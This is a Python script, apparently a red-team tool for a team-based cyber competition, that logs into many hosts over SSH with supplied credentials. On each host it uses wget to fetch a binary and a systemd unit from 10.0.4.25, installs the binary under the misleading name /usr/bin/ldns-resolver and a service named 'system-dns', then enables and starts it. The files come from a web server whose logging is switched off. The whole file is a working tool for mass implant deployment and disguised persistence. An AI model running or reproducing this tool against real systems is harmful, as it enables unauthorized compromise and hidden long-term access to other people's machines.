import argparse
import paramiko
import os
import re
import sys
import signal
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import SimpleHTTPRequestHandler
from multiprocessing import Process
from socketserver import TCPServer

COMMANDS = [
    "wget http://10.0.4.25/resolution -O /usr/bin/ldns-resolver",
    "wget http://10.0.4.25/system-dns.service -O /usr/lib/systemd/system/system-dns.service",
    "chmod +x /usr/bin/ldns-resolver",
    "systemctl enable system-dns",
    "systemctl start system-dns"
]
SERVER = "10.0.4.25"
WEBDIR = os.path.join(os.path.dirname(__file__), 'files')

parser = argparse.ArgumentParser(description="Linux Deployment via SSH")
parser.add_argument("username", type=str)
parser.add_argument("password", type=str)
parser.add_argument("cidr", type=str, nargs='+', help="CIDR notation of addreses. Use X for placeholder for team number, Y for host placeholder")
parser.add_argument("--teams", type=int, nargs=1)
parser.add_argument("--hosts", type=str, nargs=1)
parser.add_argument("--threads", type=int, nargs=1, default=5)
parser.add_argument("--single", action="store_true")
args = parser.parse_args()
if args.hosts:
    args.hosts = args.hosts[0].split(',')

# Generate the IP addresses that we're going to need to deploy on
team_number = re.compile(r"[xX]")
host_number = re.compile(r"[yY]")
addresses = []

# If we just want to deploy on one host just use --single argument
if not args.single:
    for addr in args.cidr:
        for team in range(args.teams[0] + 1):
            for i in args.hosts:
                out = team_number.sub(str(team), addr)
                out = host_number.sub(i, out)
                addresses.append(out)
else:
    addresses = args.cidr

def deploy(host, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=username, password=password)
        status_code = 0
        err = ""
        for command in COMMANDS:
            binary = command.split(" ")[0]
            _, stdout, stderr = client.exec_command(command)
            status_code += int(stdout.channel.recv_exit_status())
            err += f"\t[{binary}] {stderr.readline().strip()}\n"
            if status_code:
                break

        client.close()
        return status_code, err
    except paramiko.SSHException as e:
        return 1, str(e)

def failure(output): print("\033[91m {}\033[00m" .format(output)) 
def success(output): print("\033[92m {}\033[00m" .format(output)) 

class SilentWebserver(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return 

if __name__ == "__main__":
    pid = os.fork()
    #pid = 10

    # Child process will handle standing up webserver
    if pid == 0:
        try:
            # Stand up the webserver to host the binary and service file
            print(f"[STATUS] Starting Webserver...")
            httpd = TCPServer((SERVER, 80), SilentWebserver)
            os.chdir(WEBDIR)
            server_process = Process(target=httpd.serve_forever)
            server_process.run()
            server_process.join()
        except KeyboardInterrupt:
            print("[STATUS] Closing Webserver...")
        except Exception as e:
            print(f"[STATUS] Error standing up webserver: {str(e)}")
    else:
        time.sleep(1)
        print("[STATUS] Starting deployment...")

        # Start deploying the binary
        with ThreadPoolExecutor(args.threads) as pool:
            # For each host we need to deploy to, submit a request
            # to the pool to run the command This will yield a
            # concurrent.Future object and map the address string to that object
            tasks = {pool.submit(deploy, host, args.username, args.password): host for host in addresses}
            # As tasks are completed by the pool, they will appear
            # in the output of as_completed(tasks)
            for future in as_completed(tasks):
                ip = tasks[future]
                status, out = future.result()
                if int(status):
                    failure(f"[{ip}] FAIL.\n{out}")
                else:
                    success(f"[{ip}] SUCCESS.")

        print("[STATUS] Deployment Complete.")
        # Stop the webserver
        os.kill(pid, signal.SIGKILL)


            






